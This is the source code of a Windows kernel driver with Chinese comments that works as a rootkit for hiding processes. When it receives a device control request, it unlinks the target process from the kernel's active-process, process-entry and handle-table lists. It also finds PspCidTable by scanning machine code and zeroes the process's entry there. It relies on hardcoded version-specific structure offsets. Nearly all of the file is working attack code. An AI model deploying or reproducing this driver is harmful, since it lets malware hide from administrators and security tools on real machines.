#include <ntifs.h>
#include <wdm.h>

#define SYMLINK_NAME L"\\??\\HideProcess"
#define DEVICE_NAME L"\\device\\HideProcess"
#define HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

PDEVICE_OBJECT pDevice;

VOID UnlinkActiveProcessLists(PEPROCESS PE)
{
    // 在 EPROCESS 的 Offset 0x2e8 取得 ActiveProcessLink
    LIST_ENTRY* ActiveProcessLink = (LIST_ENTRY*)((ULONG64)PE + 0x2e8);

    // 將 ActiveProcessLink 斷鏈
    if (ActiveProcessLink->Blink != 0 && ActiveProcessLink->Flink != 0)
    {
        ActiveProcessLink->Blink->Flink = ActiveProcessLink->Flink;
        ActiveProcessLink->Flink->Blink = ActiveProcessLink->Blink;
        ActiveProcessLink->Blink = 0;
        ActiveProcessLink->Flink = 0;
    }
}

VOID UnlinkProcessListEntry(PEPROCESS PE)
{
    // 取得在 EPROCESS 的 Pcb 中的 ProcessListEntry (Offset 0x240)
    LIST_ENTRY* ProcessListEntry = (LIST_ENTRY*)((ULONG64)PE + 0x240);

    // 將 ProcessListEntry 斷鏈
    if (ProcessListEntry->Blink != 0 && ProcessListEntry->Flink != 0)
    {
        ProcessListEntry->Blink->Flink = ProcessListEntry->Flink;
        ProcessListEntry->Flink->Blink = ProcessListEntry->Blink;
        ProcessListEntry->Blink = 0;
        ProcessListEntry->Flink = 0;
    }
}

VOID UnlinkHandleTableList(PEPROCESS PE)
{
    // 在 EPROCESS 的 Offset 0x418 取得 HandleTable
    ULONG64 HandleTable = *(PULONG64)((ULONG64)PE + 0x418);

    // 再從 HandleTable 的 Offset 0x18 取得 HandleTableList
    LIST_ENTRY* HandleTableList = (LIST_ENTRY*)(HandleTable + 0x18);

    // 將 HandleTableList 斷鏈
    HandleTableList->Blink->Flink = HandleTableList->Flink;
    HandleTableList->Flink->Blink = HandleTableList->Blink;
    HandleTableList->Blink = HandleTableList;
    HandleTableList->Flink = HandleTableList;
}

BOOLEAN get_PspCidTable(ULONG64* tableAddr)
{
    // 取得 PsLookupProcessByProcessId 位址
    UNICODE_STRING uc_funcName;
    RtlInitUnicodeString(&uc_funcName, L"PsLookupProcessByProcessId");
    ULONG64 ul_funcAddr = (ULONG64)MmGetSystemRoutineAddress(&uc_funcName);

    // 在 PsLookupProcessByProcessId 的前 0x30 Bytes 中找 call PspReferenceCidTableEntry 的位址
    ULONG64 ul_entry = 0;
    for (INT i = 0; i < 0x30; i++)
    {
        // 用 call 的 opcode 0xe8 定位 PspReferenceCidTableEntry
        if (*(PUCHAR)(ul_funcAddr + i) == 0xe8)
        {
            ul_entry = ul_funcAddr + i;
            break;
        }
    }

    if (ul_entry != 0)
    {
        // Parse 出 PspReferenceCidTableEntry 的位址
        INT i_callCode = *(INT*)(ul_entry + 1);
        ULONG64 ul_callJmp = ul_entry + i_callCode + 5;

        // 在 PspReferenceCidTableEntry 的前 0x30 Bytes 中找 PspCidTable
        for (INT i = 0; i < 0x30; i++)
        {
            // 用 "mov rax, [PspCidTable]" 特徵定位 PspCidTable
            if (*(PUCHAR)(ul_callJmp + i) == 0x48 && *(PUCHAR)(ul_callJmp + i + 1) == 0x8b &&
                *(PUCHAR)(ul_callJmp + i + 2) == 0x05)
            {
                // Parse 出 PspCidTable 的位址
                INT i_movCode = *(INT*)(ul_callJmp + i + 3);
                ULONG64 ul_movJmp = ul_callJmp + i + i_movCode + 7;
                *tableAddr = *(ULONG64*)ul_movJmp;
                return TRUE;
            }
        }
    }

    return FALSE;
}

VOID NullPspCidTable(ULONG64 pid)
{
    // 取得 PspCidTable
    ULONG64 PspCidTable = 0;
    if (get_PspCidTable(&PspCidTable))
    {
        ULONG64 entry;

        // 取得 PspCidTable 中 _HANDLE_TABLE 結構裡的 TableCode，最後 3 bits 則代表幾級指標
        ULONG64 TableCode = *((ULONG64*)PspCidTable + 1);
        ULONG64 TableLevel = TableCode & 3;

        if ((ULONG)TableLevel == 2)
        {
            // 如果是三級指標，要 Reference 2 次 Table 才能找到 EPROCESS 的 Entry
            ULONG64 EprocessList = *(ULONG64*)(*(ULONG64*)(TableCode + 8 * (pid >> 19) - 2) + 8 * ((pid >> 10) & 0x1FF));
            entry = EprocessList + 4 * (pid & 0x3FF);
        }
        else if ((ULONG)TableLevel == 1)
        {
            // 如果是二級指標，只要 Reference 1 次 Table 才能找到 EPROCESS 的 Entry
            ULONG64 EprocessList = *(ULONG64*)(TableCode + 8 * (pid >> 10) - 1);
            entry = EprocessList + 4 * (pid & 0x3FF);
        }
        else
        {
            // 如果是一級指標，可以直接算出 EPROCESS 的 Entry
            entry = TableCode + 4 * pid;
        }

        // 將目標 Process 的 Entry 清零
        *(PULONG64)entry = 0;
    }
}

NTSTATUS Dispatcher(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
    ULONG inputBufferLength = 0;
    ULONG outputBufferLength = 0;
    ULONG ioControlCode = 0;
    PEPROCESS pEprocess = NULL;
    PIO_STACK_LOCATION ioStackLocation = IoGetCurrentIrpStackLocation(pIrp);
    if (pDeviceObject != pDevice)
    {
        return STATUS_UNSUCCESSFUL;
    }

    // 根據 IRP 做對應的處理
    switch (ioStackLocation->MajorFunction)
    {
        case IRP_MJ_DEVICE_CONTROL:
            // 取得從應用程式傳來的資料
            inputBufferLength = ioStackLocation->Parameters.DeviceIoControl.InputBufferLength;
            outputBufferLength = ioStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
            ioControlCode = ioStackLocation->Parameters.DeviceIoControl.IoControlCode;
            HANDLE processId = *(HANDLE*)pIrp->AssociatedIrp.SystemBuffer;

            // 根據 IoControlCode 做對應處理
            switch (ioControlCode)
            {
                case HIDE_PROCESS:
                    // 隱藏目標 Process
                    PsLookupProcessByProcessId(processId, &pEprocess);
                    UnlinkActiveProcessLists(pEprocess);
                    UnlinkHandleTableList(pEprocess);
                    UnlinkProcessListEntry(pEprocess);
                    NullPspCidTable((ULONG64)processId);
                    break;
                default:
                    break;
            }
            break;
        default:
            break;
    }

    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
    UNICODE_STRING symLinkName;
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);

    // 在卸載時刪除之前建立的 Device 與 Symbolic Link
    IoDeleteSymbolicLink(&symLinkName);
    IoDeleteDevice(pDriverObject->DeviceObject);
}

NTSTATUS CreateDevice(PDRIVER_OBJECT pDriverObject)
{
    NTSTATUS status;
    UNICODE_STRING deviceName;
    UNICODE_STRING symLinkName;
    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);

    // 建立一個 Device
    status = IoCreateDevice(pDriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, 1, &pDevice);
    if (NT_SUCCESS(status))
    {
        pDriverObject->DeviceObject = pDevice;

        // 建立一個 Symbolic Link 連結到這個 Device
        status = IoCreateSymbolicLink(&symLinkName, &deviceName);
    }
    return status;
}

extern NTSTATUS DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath)
{
    UNREFERENCED_PARAMETER(registryPath);
    NTSTATUS status = STATUS_SUCCESS;

    // 要設定卸載函數驅動程式才能順利卸載
    driverObject->DriverUnload = DriverUnload;

    // 建立 Device 與對應的 Symbolic Link
    status = CreateDevice(driverObject);

    // 為需要用到的 IRP 定義處理函數
    driverObject->MajorFunction[IRP_MJ_CREATE] = Dispatcher;
    driverObject->MajorFunction[IRP_MJ_CLOSE] = Dispatcher;
    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Dispatcher;

    return STATUS_SUCCESS;
}